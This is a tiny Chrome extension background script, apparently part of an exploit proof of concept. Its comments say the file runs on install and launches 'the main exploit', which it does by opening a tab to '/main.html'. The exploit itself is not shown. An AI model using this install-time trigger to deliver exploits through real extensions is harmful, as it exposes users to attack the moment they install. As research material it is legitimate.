// Because this file is a background script, it is executed as soon as the
// extension is installed.
// As soon as the extension is installed, the main exploit should be launched:
chrome.tabs.create({url:'/main.html'});
